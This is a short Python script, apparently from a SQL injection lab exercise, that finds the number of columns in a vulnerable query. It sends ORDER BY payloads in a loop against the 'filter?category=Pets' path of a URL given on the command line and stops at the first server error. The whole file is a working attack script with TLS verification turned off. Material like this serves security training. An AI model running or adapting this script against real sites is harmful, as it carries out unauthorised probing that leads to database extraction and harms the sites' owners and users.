import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def exploit_sqli_columns(url):
    path = "filter?category=Pets"
    for i in range(1,50):
        sql_payload = "'+ORDER+BY+%s--"%i
        r = requests.get(url + path + sql_payload , verify=False)
        res = r.text
        
        if "Internal Server Error" in res:
            return i-1
        i = i+1 
    
    return False


if __name__ == "__main__":
        try:
            url = sys.argv[1].strip()
        except IndexError:
            print("[.] Usage: %s <url>" % sys.argv[0])
            print("[.] Example: %s www.example.com" % sys.argv[0])
            sys.exit(-1)
        
        print("[+] Figuring out the number of columns...")
        num_col = exploit_sqli_columns(url)

        if num_col:
            print("[+] The number of cols is %s" % str(num_col))
        else:
            print("[-] Attack unsuccessful")

